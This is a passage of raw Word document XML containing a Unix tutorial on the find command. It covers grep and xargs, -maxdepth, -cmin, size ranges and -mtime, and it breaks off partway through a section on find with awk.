      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>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grep “</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>MemoryCache</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>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this will search all java files starting from current directory for the word "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>MemoryCache</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve">". we can also leave -print option in all cases because its default for </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>UNIX finds command</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> as pointed out by Ben in comments. You can further sort the result of find command using </w:t>
      </w:r>
      <w:hyperlink r:id="rId49" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:b/>
            <w:color w:val="0066CC"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
            <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
          </w:rPr>
          <w:t>Sort command in Unix.</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2D81141A" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>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66"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> . –name </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>"*.txt"</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000066"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> –print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66"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="C20CB9"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>xargs</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000066"/>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grep</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000066"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>"Exception"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BED0575"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5EF73570"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lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>7. Finding files only in the current directory not searching on subdirectories</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CCA0505"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 xml:space="preserve">While using find command, I realized that sometimes I only need to </w:t>
      </w:r>
      <w:hyperlink r:id="rId50" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:color w:val="0066CC"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
            <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
          </w:rPr>
          <w:t>find files and directories</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> that are new, only in the current directory so I modified the find command as follows.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You can use find –type option to specify the search for the only file, link or directory and -</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>maxdepth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> option specifies how deep find command has to search.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D2F69E7"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>maxdepth</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1 </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>-type</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> f </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>-newer</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>first_file</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="1EFEC200"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Another way of doing it is below:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E652FE0" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>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66"/>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-type</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000066"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> f </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>cmin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000066"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>15</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000066"/>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-prune</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AEA6EDA" w14:textId="5819FAE6"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Means type file, last modified 15 minutes ago, only look at the current directory. (No sub-directories). Btw, if you are new to UNIX and don't know what does the dot (.) and double dot (..) means, current directory and parent directory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77BB1E4C" w14:textId="60863428"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
    <w:p w14:paraId="59EDEDE7"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lastRenderedPageBreak/>
        <w:t xml:space="preserve">Following find example shows how you can use find –size option to </w:t>
      </w:r>
      <w:hyperlink r:id="rId51" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:color w:val="0066CC"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
            <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
          </w:rPr>
          <w:t>find files based upon certain size</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>. This will</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>find all files in current directory and sub-directory, greater than some size using find command in UNIX:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17CCAB36"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-size</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> +1000c </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>-exec</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-l</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7A0874"/>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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="21D0E680"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Always use a c after the number, and specify the size in bytes, otherwise, you will get confused because of find -size list files based on the size of the disk block.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Also, to find files using a range of file sizes, a minus or plus sign can be specified before the number. The minus sign means "less than," and the plus sign means "greater than."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 xml:space="preserve">Suppose if you want to find all the files within a range you can use </w:t>
      </w:r>
      <w:hyperlink r:id="rId52" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:color w:val="0066CC"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
            <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
          </w:rPr>
          <w:t>find command</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> as in below example of find:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66277299" w14:textId="77777777" w:rsidR="00482630" w:rsidRPr="00AD72DF" w:rsidRDefault="00482630" w:rsidP="00482630">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="F0F0F0"/>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66"/>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-size</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000066"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> +10000c </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>-size</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000066"/>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-50000c</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000066"/>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-print</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="126436F8"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 xml:space="preserve">This </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>find example</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> lists all files that are greater than 10,000 bytes, but less than 50,000 bytes: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299D8456"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color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:u w:val="single"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>Example 9 – How to find files some days older and above a certain size</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AEAB295"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We can combine –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>mtime</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> and –size to find files which are some days old and greater than some size in Unix. A very common scenario where you want to delete </w:t>
      </w:r>
      <w:hyperlink r:id="rId53" w:tgtFrame="_blank" w:history="1">
        <w:r w:rsidRPr="00AD72DF">
          <w:rPr>
            <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
            <w:color w:val="0066CC"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
            <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
          </w:rPr>
          <w:t>some large old files to free some space</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> in your machine.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This example of find command will find which are more than 10 days old and size greater than 50K.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38D1C1B7"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>mtime</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> +10 </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>-size</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> +50000c </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="660033"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>-exec</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-l</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7A0874"/>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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62015D2C"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69605D10"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lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>10) Find and AWK</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30DF2739"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lastRenderedPageBreak/>
        <w:br/>
        <w:t xml:space="preserve">You can use </w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>awk</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:i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in a combination of find to print a formatted output e.g. next command will</w:t>
      </w:r>
      <w:r w:rsidRPr="00AD72DF">
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsia="Times New Roman" w:hAnsiTheme="majorHAnsi" w:cstheme="majorHAnsi"/>
          <w:b/>
          <w:bCs/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-IN" w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t xml:space="preserve"> find all of the </w:t>
      </w:r>
